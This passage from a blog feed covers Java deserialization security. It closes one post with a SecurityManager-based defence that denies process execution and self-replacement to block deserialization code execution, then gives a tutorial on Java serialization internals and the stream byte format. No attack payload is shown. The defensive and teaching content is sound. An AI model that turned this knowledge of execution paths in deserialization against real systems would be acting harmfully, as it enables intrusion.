class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">noSerial</span><span class="params">()</span></span>&#123;</span><br><span class="line">    SecurityManager originalSecurityManager = System.getSecurityManager();</span><br><span class="line">    <span class="keyword">if</span> (originalSecurityManager == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 创建自己的SecurityManager</span></span><br><span class="line">        SecurityManager sm = <span class="keyword">new</span> SecurityManager() &#123;</span><br><span class="line">            <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">check</span><span class="params">(Permission perm)</span> </span>&#123;</span><br><span class="line">                <span class="comment">// 禁止exec</span></span><br><span class="line">                <span class="keyword">if</span> (perm <span class="keyword">instanceof</span> java.io.FilePermission) &#123;</span><br><span class="line">                    String actions = perm.getActions();</span><br><span class="line">                    <span class="keyword">if</span> (actions != <span class="keyword">null</span> &amp;&amp; actions.contains(<span class="string">"execute"</span>)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> SecurityException(<span class="string">"execute denied!"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 禁止设置新的SecurityManager，保护自己</span></span><br><span class="line">                <span class="keyword">if</span> (perm <span class="keyword">instanceof</span> java.lang.RuntimePermission) &#123;</span><br><span class="line">                    String name = perm.getName();</span><br><span class="line">                    <span class="keyword">if</span> (name != <span class="keyword">null</span> &amp;&amp; name.contains(<span class="string">"setSecurityManager"</span>)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> SecurityException(<span class="string">"System.setSecurityManager denied!"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkPermission</span><span class="params">(Permission perm)</span> </span>&#123;</span><br><span class="line">                check(perm);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkPermission</span><span class="params">(Permission perm, Object context)</span> </span>&#123;</span><br><span class="line">                check(perm);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        System.setSecurityManager(sm);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将创建ObjectInputStream对象的语句换回原来的ObjectInputStream类，在反序列化之前调用前面定义的函数noSerial()，运行发现，无报错，也没有弹出计算器，即防御成功：</p><p><img src="/2019/02/06/Java反序列化漏洞/8.png" alt="demo3"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/vuls/170344.html" target="_blank" rel="noopener">Java反序列化漏洞的原理分析</a></p><p><a href="https://xz.aliyun.com/t/2041" target="_blank" rel="noopener">Java反序列化漏洞从入门到深入</a></p><p><a href="https://www.cnblogs.com/ssooking/p/5875215.html" target="_blank" rel="noopener">Java反序列化漏洞分析</a></p><p><a href="https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md" target="_blank" rel="noopener">浅析Java序列化和反序列化</a></p><p><a href="https://paper.seebug.org/312/" target="_blank" rel="noopener">深入理解 JAVA 反序列化漏洞</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在学习Java反序列化漏洞之前，建议先熟悉&lt;a href=&quot;https://mi1k7ea.github.io/2019/02/03/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5
      
    
    </summary>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/categories/Java/"/>
    
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java序列化和反序列化机制</title>
    <link href="https://Mi1k7ea.github.com/2019/02/03/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6/"/>
    <id>https://Mi1k7ea.github.com/2019/02/03/Java序列化和反序列化机制/</id>
    <published>2019-02-03T12:12:02.000Z</published>
    <updated>2019-02-08T14:26:22.434Z</updated>
    
    <content type="html"><![CDATA[<p>这里主要讲解Java序列化及反序列化机制。</p><h2 id="何为序列化"><a href="#何为序列化" class="headerlink" title="何为序列化"></a>何为序列化</h2><p>Java 提供了一种对象序列化的机制：一个对象可以被表示为一个字节序列，该字节序列包括该对象的数据、有关对象的类型的信息和存储在对象中数据的类型。将序列化对象写入文件之后，可以从文件中读取出来，并且对它进行反序列化，也就是说，对象的类型信息、对象的数据，还有对象中的数据类型可以用来在内存中新建对象。整个过程都是JVM独立的，也就是说，在一个平台上序列化的对象可以在另一个完全不同的平台上反序列化该对象。</p><p>序列化：把对象转换为字节序列的过程。</p><p>反序列化：把字节序列恢复为对象的过程。</p><h2 id="为何设计序列化"><a href="#为何设计序列化" class="headerlink" title="为何设计序列化"></a>为何设计序列化</h2><p>1、可以弥补不同操作系统之间的差异，如Windows上创建的对象进行序列化后通过网络传到Linux上可直接反序列化得到该对象而无需担心数据在不同机器、系统上的表示会不同；</p><p>2、对Java的远程方法调用RMI是必需的。RMI是为了使得存在于其他主机上的对象使用起来像本机上的对象一样，当向远程对象发送信息时，需要通过对象序列化来传输参数和返回值；</p><p>3、对Java Bean是必需的。使用一个Bean时，一般情况下是在设计阶段对它的状态信息进行配置，然而这种状态信息需要保存下来，并在程序启动时进行后期恢复，这时是靠反序列化机制来完成的；</p><p>4、方便保存对象信息以便于下次JVM启动时可以直接使用。</p><h2 id="序列化的条件"><a href="#序列化的条件" class="headerlink" title="序列化的条件"></a>序列化的条件</h2><p>一个类对象要想实现序列化，必须满足两个条件：</p><p>1、该类必须实现 java.io.Serializable 对象。</p><p>2、该类的所有属性必须是可序列化的。如果有一个属性不是可序列化的，则该属性必须注明是短暂的。</p><h2 id="如何序列化"><a href="#如何序列化" class="headerlink" title="如何序列化"></a>如何序列化</h2><p>要序列化一个对象，首先要创建OutputStream对象，再将其封装在一个ObjectOutputStream对象内，接着只需调用writeObject()即可将对象序列化，并将其发送给OutputStream（对象是基于字节的，因此要使用InputStream和OutputStream来继承层次结构）。</p><p>要反序列化出一个对象，需要将一个InputStream封装在ObjectInputStream内，然后调用readObject()即可。</p><p><strong>ObjectInputStream/ObjectOutputStream类</strong></p><p>类 ObjectInputStream 和 ObjectOutputStream 是高层次的数据流，它们包含反序列化和序列化对象的方法。</p><p>ObjectOutputStream 类包含很多写方法来写各种数据类型，但是一个特别的方法例外即writeObject()，其用来序列化一个对象，并将它发送到输出流：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(Object x)</span> <span class="keyword">throws</span> IOException</span></span><br></pre></td></tr></table></figure><p>同样的，ObjectInputStream类包含反序列化一个对象的方法readObject()，其用于从流中取出下一个对象，并将对象反序列化，它的返回值为Object，因此需要将它转换成合适的数据类型：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> Object <span class="title">readObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br></pre></td></tr></table></figure><p><strong>Demo</strong></p><p> 定义一个User类，继承Serializable接口，其中address字段设置transient关键字：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">transient</span> String address;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> number;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">info</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Name: "</span> + name + <span class="string">"\nAddress: "</span> + address + <span class="string">"\nNumber: "</span> + number);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写一个进行序列化操作的类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.name = <span class="string">"Mi1k7ea"</span>;</span><br><span class="line">        user.address = <span class="string">"England"</span>;</span><br><span class="line">        user.number = <span class="number">666</span>;</span><br><span class="line">        user.info();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"user.ser"</span>);</span><br><span class="line">            ObjectOutputStream obs = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">            obs.writeObject(user);</span><br><span class="line">            obs.close();</span><br><span class="line">            fos.close();</span><br><span class="line">            System.out.println(<span class="string">"[*]User对象已经序列化保存到user.ser文件中"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        serialize_test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后查看输出，给该User对象赋值成功并保存到了目标文件中：</p><p><img src="/2019/02/03/Java序列化和反序列化机制/2.png" alt="序列化demo"></p><p>用WinHex打开user.ser文件查看：</p><p><img src="/2019/02/03/Java序列化和反序列化机制/1.png" alt="序列化demo"></p><p>在刚刚的test.class中添加反序列化操作的函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.name = <span class="string">"Mi1k7ea"</span>;</span><br><span class="line">        user.address = <span class="string">"England"</span>;</span><br><span class="line">        user.number = <span class="number">666</span>;</span><br><span class="line">        user.info();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"user.ser"</span>);</span><br><span class="line">            ObjectOutputStream obs = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">            obs.writeObject(user);</span><br><span class="line">            obs.close();</span><br><span class="line">            fos.close();</span><br><span class="line">            System.out.println(<span class="string">"[*]User对象已经序列化保存到user.ser文件中"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unserialize_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"user.ser"</span>);</span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">            user = (User)ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">            fis.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"[*]反序列化后的内容："</span>);</span><br><span class="line">        user.info();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        serialize_test();</span></span><br><span class="line">        unserialize_test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，readObject()方法中的try/catch代码块尝试捕获 ClassNotFoundException 异常。对于JVM可以反序列化对象，它必须是能够找到字节码的类。如果JVM在反序列化对象的过程中找不到该类，则抛出一个ClassNotFoundException异常。</p><p>查看反序列化结果：</p><p><img src="/2019/02/03/Java序列化和反序列化机制/3.png" alt="反序列化demo"></p><p>可以看到反序列化出来的对象，除了Address属性外其余的属性值都成功地反序列化出来了得到几乎和序列化之前一样的对象。这里Address属性是因为设置了transient关键字，具体的原理在下面会讲解。</p><h2 id="serialVersionUID"><a href="#serialVersionUID" class="headerlink" title="serialVersionUID"></a>serialVersionUID</h2><p>serialVersionUID即序列化的版本号，适用于Java的序列化机制。简单来说，Java的序列化机制是通过判断类的serialVersionUID来验证版本一致性的。在进行反序列化时，JVM会把传来的字节流中的serialVersionUID与本地相应实体类的serialVersionUID进行比较，如果相同就认为是一致的，可以进行反序列化，否则就会出现序列化版本不一致的异常，即是InvalidCastException。</p><p><strong>具体的序列化过程是这样的</strong>：序列化操作的时候系统会把当前类的serialVersionUID写入到序列化文件中，当反序列化时系统会去检测文件中的serialVersionUID，判断它是否与当前类的serialVersionUID一致，如果一致就说明序列化类的版本与当前类版本是一样的，可以反序列化成功，否则失败。</p><p><strong>serialVersionUID有两种显示的生成方式：</strong></p><p>一是默认的1L，比如：private static final long serialVersionUID = 1L；</p><p>二是根据类名、接口名、成员方法及属性等来生成一个64位的哈希字段，比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = xxxxL;</span><br></pre></td></tr></table></figure><p>当一个类实现了Serializable接口，如果没有显示的定义serialVersionUID，Eclipse会提供相应的提醒。面对这种情况，我们只需要在Eclipse中点击类中warning图标一下，Eclipse就会自动给定两种生成的方式。如果不想定义，在Eclipse的设置中也可以把它关掉的，设置如下：</p><p>Window ==&gt; Preferences ==&gt; Java ==&gt; Compiler ==&gt; Error/Warnings ==&gt; Potential programming problems<br>将Serializable class without serialVersionUID的warning改成ignore即可。</p><p>当实现java.io.Serializable接口的类没有显式地定义一个serialVersionUID变量时候，Java序列化机制会根据编译的Class自动生成一个serialVersionUID作序列化版本比较用，这种情况下，如果Class文件(类名，方法明等)没有发生变化(增加空格，换行，增加注释等等)，就算再编译多次，serialVersionUID也不会变化的。</p><p><strong>显式地定义serialVersionUID有两种用途：</strong></p><p>1、 在某些场合，希望类的不同版本对序列化兼容，因此需要确保类的不同版本具有相同的serialVersionUID；</p><p>2、 在某些场合，不希望类的不同版本对序列化兼容，因此需要确保类的不同版本具有不同的serialVersionUID。</p><h2 id="序列化的控制"><a href="#序列化的控制" class="headerlink" title="序列化的控制"></a>序列化的控制</h2><p>在某些情况下，我们可能需要对序列化的过程进行控制，比如说不需要哪些部分被反序列化等，这时可通过Externalizable接口替代Serializable接口来实现对序列化过程的控制。</p><p><strong>1、Externalizable</strong></p><p>Externalizable接口继承了Serializable接口，同时添加了两个方法即writeExternal()和readExternal()，两者会在序列化和反序列化的过程中被自动调用，以便于执行一些特殊操作来实现过程控制。</p><p><strong>2、transient关键字</strong></p><p>当我们对序列化进行控制时，可能有些特殊子对象不想让Java的序列化机制自动保存和恢复，比如说子对象表示的是敏感信息。即使对象中的这些信息是private属性，但经过序列化处理后人们就可以通过读取文件或拦截数据报文来非法获取该信息。</p><p>这时存在两个方法。一是通过将类实现为前面的Externalizable，这时无任何东西可以自动序列化，并且可在writeExternal()内部只对所需部分进行显式的序列化；二是当我们正在操作的是一个Serializable对象，则所有序列化操作会自动执行，这时就可应用到transient（瞬时）关键字来逐个字段地关闭序列化，即说明指定字段内容在序列化中是不需要保存或恢复操作的。</p><p>由于Externalizable对象在默认情况下不保存它们的任何字段，所以<strong>transient关键字只能和Serializable对象一起使用</strong>。</p><p><strong>3、自己实现Serializable</strong></p><p>若非十分坚定地使用Externalizable接口，那么还可以自己实现Serializable接口，并添加writeObject()和readObject()方法，一旦对象被序列化和反序列化还原，就会自动地分别调用这两个方法。值得注意的是，这里说的是“添加”而非“覆盖”或“实现”，也就是说，<strong>只要我们提供了这两个方法，程序就会使用这两个方法而非默认的序列化机制。</strong></p><p>这些方法必须具有准确的方法特征签名：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream stream)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream stream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br></pre></td></tr></table></figure><p>注意，这些方法被定义成了private。</p><p>在调用ObjectOutputStream.writeObject()时，会检查所传递的Serializable对象，看看是否实现了自己的writeObject()，若实现了，则跳过正常的序列化过程并调用自己实现的writeObject()。readObject()方法的情形类似。</p><h2 id="序列化的二进制格式"><a href="#序列化的二进制格式" class="headerlink" title="序列化的二进制格式"></a>序列化的二进制格式</h2><p>看回刚才用WinHex打开的序列化Demo生成的user.ser文件：</p><p><img src="/2019/02/03/Java序列化和反序列化机制/1.png" alt="序列化demo"></p><p>AC ED：STREAM_MAGIC，声明使用了序列化协议，从这里可以判断保存的内容是否为序列化数据。</p><p>00 05：STREAM_VERSION，序列化协议版本。</p><p>0x73：TC_OBJECT，声明这是一个新的对象。</p><p>0x72：TC_CLASSDESC，声明这里开始一个新Class。</p><p>00 04：Class名字的长度，这里Class名为User，长度为4。</p><p>55 73 65 72：类名称User。</p><p>64 D4 C4 D2 26 CA C4 8D：SerialVersionUID，序列化ID，如果没有指定，则会由算法随机生成一个8byte的ID。</p><p>0x02：标记号，该值声明该对象支持序列化。</p><p>00 02：该类所包含的域个数。</p><p>0x49：域类型，49 代表”I”，也就是Int。</p><p>00 06：域名字的长度，该域名为number、长度为6。</p><p>6E 75 6D 62 65 72：域名字描述，这里为number。</p><p>0x4C：域的类型，4C代表String。</p><p>00 04：域名字的长度，该域名为name、长度为4。</p><p>6E 61 6D 65：域名字描述，这里为name。</p><p>0x74：TC_STRING，代表一个new String，用String来引用对象。</p><p>00 12：该String长度，这里String为“Ljava/lang/String;”、长度为0x12.</p><p>4C 6A 61 76 61 2F 6C 61 6E 67 2F 53 74 72 69 6E 67 3B：JVM的标准对象签名表示法，这里是指String为“Ljava/lang/String;”。</p><p>0x78：TC_ENDBLOCKDATA，对象数据块结束的标志。</p><p>0x70：TC_NULL，说明没有其他超类的标志。</p><p>00 00 02 9A：<del>这个暂时不知道，各位大佬知道的麻烦指点一下 ：)</del></p><p>0x74：TC_STRING，代表一个new String，用String来引用对象。</p><p>00 07：域名字的长度，该域名为Mi1k7ea、长度为7。</p><p>4D 69 31 6B 37 65 61：域名字描述，这里为“Mi1k7ea”。</p><h2 id="自定义实现序列化"><a href="#自定义实现序列化" class="headerlink" title="自定义实现序列化"></a>自定义实现序列化</h2><p>如前面序列化的控制中的自己实现Serializable所说，可以添加writeObject()和readObject()这两个方法，它们并不属于任何的类和接口，只要在要序列化的类中提供这两个方法，就会在序列化机制中自动被调用。</p><p>自定义实现的好处是：程序员可以更加精细或者说可以去定制自己想要实现的序列化，如下面例子中将name和address变量值反转。利用这种特点，可以在序列化过程中对一些敏感信息做特殊的处理。</p><p>User.class：添加了private关键字的writeObject()和readObject()两个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String address;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> number;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Write Object."</span>);</span><br><span class="line">        out.writeObject(<span class="keyword">new</span> StringBuffer(name).reverse());</span><br><span class="line">        out.writeObject(<span class="keyword">new</span> StringBuffer(address).reverse());</span><br><span class="line">        out.writeInt(number);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Read Object."</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = ((StringBuffer)in.readObject()).reverse().toString();</span><br><span class="line">        <span class="keyword">this</span>.address = ((StringBuffer)in.readObject()).reverse().toString();</span><br><span class="line">        <span class="keyword">this</span>.number = in.readInt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.class：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.name = <span class="string">"Mi1k7ea"</span>;</span><br><span class="line">        user.address = <span class="string">"England"</span>;</span><br><span class="line">        user.number = <span class="number">666</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"user.ser"</span>);</span><br><span class="line">            ObjectOutputStream obs = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">            obs.writeObject(user);</span><br><span class="line">            obs.close();</span><br><span class="line">            fos.close();</span><br><span class="line">            System.out.println(<span class="string">"[*]User对象已经序列化保存到user.ser文件中"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unserialize_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"user.ser"</span>);</span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">            user = (User)ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">            fis.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"Name: "</span> + user.name + <span class="string">"\nAddress: "</span> + user.address + <span class="string">"\nNumber: "</span> + user.number);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        serialize_test();</span><br><span class="line">        unserialize_test();</span><br><span class="line">    &#125;</span><br><span 